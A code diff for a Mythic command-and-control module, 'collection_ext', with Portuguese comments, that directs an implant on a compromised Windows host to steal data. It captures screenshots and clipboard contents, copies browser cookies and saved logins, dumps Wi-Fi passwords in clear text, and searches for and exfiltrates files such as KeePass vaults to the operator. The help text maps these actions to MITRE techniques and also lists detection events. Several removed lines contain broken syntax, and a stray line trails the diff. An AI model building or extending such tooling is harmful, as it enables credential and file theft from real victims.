@@ -1,6 +1,6 @@
 from mythic_container.MythicCommandBase import *
 from mythic_container.MythicRPC import *
-import json, base64
+import json
 
 
 class CollectionExtArguments(TaskArguments):
@@ -12,8 +12,8 @@ class CollectionExtArguments(TaskArguments):
                 type=ParameterType.String,
                 parameter_group_info=[ParameterGroupInfo(required=False)],
                 description=(
-                    "screenshot | clipboard | browser | wifi | search | get | "
-                    "multiget. Padrão: screenshot."
+                    "screenshot | clipboard | browser | wifi | search | get | multiget. "
+                    "Padrão: screenshot."
                 ),
                 default_value="screenshot",
             ),
@@ -34,7 +34,6 @@ class CollectionExtArguments(TaskArguments):
             CommandParameter(
                 name="keywords",
                 type=ParameterType.String,
-                framework: ParameterType.String,
                 parameter_group_info=[ParameterGroupInfo(required=False)],
                 description="(search/multiget) palavras-chave no nome (vírgula).",
                 default_value="",
@@ -73,27 +72,24 @@ class CollectionExtArguments(TaskArguments):
         if self.command_line:
             if self.command_line.strip().startswith("{"):
                 d = json.loads(self.command_line)
-                self.add_arg("action",     d.get("action", "screenshot"))
-                self.add_arg("path",       d.get("path", ""))
-                self.add_arg("exts",       d.get("exts",
-                             ".doc,.docx,.xls,.xlsx,.pdf,.kdbx,.rdp,.txt"))
-                self.add_arg("keywords",   d.get("keywords", ""))
-                self.add_arg("browser",    d.get("browser", "chrome"))
-                self.add_arg("all_drives", d.get("all_drives", False),
-                             ParameterType.Boolean)
-                self.add_arg("max_files",  d.get("max_files", 200),
-                             ParameterType.Number)
-                self.add_arg("max_mb",     d.get("max_mb", 50),
-                             ParameterType.Number)
+                self.add_arg("action",     d.get("action",     "screenshot"))
+                self.add_arg("path",       d.get("path",       ""))
+                self.add_arg("exts",       d.get("exts",       ".doc,.docx,.xls,.xlsx,.pdf,.kdbx,.rdp,.txt"))
+                self.add_arg("keywords",   d.get("keywords",   ""))
+                self.add_arg("browser",    d.get("browser",    "chrome"))
+                self.add_arg("all_drives", d.get("all_drives", False), ParameterType.Boolean)
+                self.add_arg("max_files",  d.get("max_files",  200), ParameterType.Number)
+                self.add_arg("max_mb",     d.get("max_mb",     50),  ParameterType.Number)
             else:
+                # Posicional: [action] [path]
                 parts = self.command_line.strip().split()
-                self.add_arg("action", parts[0] if len(parts) > 0 else "screenshot")
-                self.add_arg("path",   parts[1] if len(parts) > 1 else "")
+                self.add_arg("action",     parts[0] if len(parts) > 0 else "screenshot")
+                self.add_arg("path",       parts[1] if len(parts) > 1 else "")
                 self.add_arg("exts",       ".doc,.docx,.xls,.xlsx,.pdf,.kdbx,.rdp,.txt")
                 self.add_arg("keywords",   "")
                 self.add_arg("browser",    "chrome")
                 self.add_arg("all_drives", False, ParameterType.Boolean)
-                self.add_arg("sync_files": 200, ParameterType.Number)
+                self.add_arg("max_files",  200, ParameterType.Number)
                 self.add_arg("max_mb",     50,  ParameterType.Number)
         else:
             self.add_arg("action",     "screenshot")
@@ -109,27 +105,39 @@ class CollectionExtArguments(TaskArguments):
 class CollectionExtCommand(CommandBase):
     cmd         = "collection_ext"
     needs_admin = False
-    help_cmd    = ('collection_ext {"action":"<acao>", ...} | '
-                   'collection_ext get C:\\caminho\\arquivo.txt')
+    help_cmd    = (
+        "collection_ext [action] [path]\n"
+        "collection_ext {\"action\":\"<acao>\", ...}"
+    )
     description = (
-        "Collection (MITRE TA0009) — todo conteúdo exfiltrado DIRETO pro Mythic.\n"
-        "  screenshot : captura de tela (T1113) -> PNG no Mythic\n"
-        "  clipboard  : clipboard texto/imagem (T1115) -> output/PNG\n"
+        "Collection (MITRE TA0009) no host do agente — todo o conteúdo é "
+        "exfiltrado DIRETO para o Mythic (nada persiste no alvo).\n\n"
+        "Ações:\n"
+        "  screenshot : captura a tela virtual (T1113) -> PNG no Mythic\n"
+        "  clipboard  : texto/imagem do clipboard (T1115) -> output/PNG no Mythic\n"
         "  browser    : History/Bookmarks/Cookies/Login Data de chrome/edge/\n"
         "               firefox (T1005/T1555.003) -> arquivos no Mythic\n"
         "  wifi       : SSIDs e senhas Wi-Fi em claro (T1005) -> output\n"
-        "  search     : lista arquivos por extensão/palavra-chave (T1005)\n"
-        "  get        : exfiltra 1 arquivo exato -> arquivo no Mythic\n"
-        "  multiget   : exfiltra vários por critério com limites (T1005)\n\n"
+        "  search     : lista arquivos por extensão/palavra-chave (T1005) -> output\n"
+        "  get        : exfiltra 1 arquivo exato (T1005) -> arquivo no Mythic\n"
+        "  multiget   : exfiltra vários arquivos por critério com limites de\n"
+        "               MB/quantidade (T1005) -> arquivos no Mythic\n\n"
         "Exemplos:\n"
         "  collection_ext {\"action\":\"screenshot\"}\n"
+        "  collection_ext {\"action\":\"clipboard\"}\n"
         "  collection_ext {\"action\":\"browser\",\"browser\":\"firefox\"}\n"
-        "  collection_ext {\"action\":\"get\",\"path\":\"C:\\\\Users\\\\a\\\\bk.kdbx\"}\n"
+        "  collection_ext {\"action\":\"wifi\"}\n"
+        "  collection_ext {\"action\":\"search\",\"path\":\"C:\\\\Users\\\\\",\n"
+        "                  \"keywords\":\"senha,vpn,kdbx\"}\n"
+        "  collection_ext {\"action\":\"get\",\"path\":\"C:\\\\Users\\\\a\\\\backup.kdbx\"}\n"
         "  collection_ext {\"action\":\"multiget\",\"exts\":\".kdbx,.rdp\",\"max_mb\":20}\n\n"
-        "Notas: Cookies/Login Data do Chrome/Edge cifrados DPAPI — decriptar no\n"
-        "operador. Firefox logins.json+key4.db decripta offline.\n\n"
-        "Detecção: 4688 powershell.exe, PS 4104 (CopyFromScreen/GetClipboard),\n"
-        "4688 netsh wlan key=clear, Sysmon 11 (PNG temporário em %TEMP%)"
+        "Posicional: collection_ext get C:\\Users\\a\\senhas.txt\n\n"
+        "Notas:\n"
+        "  Cookies/Login Data do Chrome/Edge são cifrados (DPAPI+AES-GCM) —\n"
+        "  decriptar no operador. Firefox logins.json+key4.db decripta offline.\n\n"
+        "Detecção no alvo:\n"
+        "  EID 4688 (powershell.exe), PS 4104 (CopyFromScreen/GetClipboard),\n"
+        "  4688 netsh wlan key=clear, Sysmon 11 (PNG temporário breve em %TEMP%)"
     )
     version               = 1
     author                = "@wtechsec"
@@ -148,9 +156,11 @@ class CollectionExtCommand(CommandBase):
             TaskID=taskData.Task.ID,
             Success=True,
         )
+
         action = taskData.args.get_arg("action") or "screenshot"
-        path   = taskData.args.get_arg("path") or ""
+        path   = taskData.args.get_arg("path")   or ""
         extra  = ""
+
         if action == "browser":
             extra = " {}".format(taskData.args.get_arg("browser") or "chrome")
         elif action in ("search", "get", "multiget"):
@@ -158,6 +168,7 @@ class CollectionExtCommand(CommandBase):
                              else "<perfil do usuário>")
             kw = taskData.args.get_arg("keywords") or ""
             extra = " {}{}".format(where, " kw:{}".format(kw) if kw else "")
+
         response.DisplayParams = "{}{}".format(action, extra)
         return response
 
@@ -182,7 +193,7 @@ class CollectionExtCommand(CommandBase):
             output = raw  # agente retornou texto puro
 
         # ── Texto → output da task (mesmo canal do winrm_ext) ────────────────
-        text = "\n".join(x for x in (output, err) JSON if x)
+        text = "\n".join(x for x in (output, err) if x)
         if text:
             await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                 TaskID=task.Task.ID,
@@ -206,9 +217,8 @@ class CollectionExtCommand(CommandBase):
                     if fr.Success:
                         await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                             TaskID=task.Task.ID,
-                            Response=("[+] Exfiltrado: {} ({} bytes) — "
-                                      "disponível na task\n".format(
-                                          name, len(contents))).encode()
+                            Response=("[+] Exfiltrado: {} ({} bytes) — disponível "
+                                      "na task\n".format(name, len(contents))).encode()
                         ))
                     else:
                         await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
@@ -223,3 +233,4 @@ class CollectionExtCommand(CommandBase):
                             name, str(e))).encode()
                     ))
         return resp
+v
